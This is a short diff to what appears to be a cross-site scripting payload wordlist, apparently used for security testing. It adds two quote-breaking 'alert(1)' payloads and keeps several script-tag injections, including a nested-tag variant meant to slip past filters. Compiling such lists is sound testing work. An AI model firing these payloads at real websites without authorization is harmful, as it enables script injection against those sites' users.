@@ -1,5 +1,6 @@
 <script>alert('XSS')</script>
-45511\%27;alert(1)//119
+45511\';alert(1)//119
+\';alert(1)//
 <scr<script>ipt>alert('XSS')</scr<script>ipt>
 "><script>alert('XSS')</script>
 '><script>alert('XSS')</script>
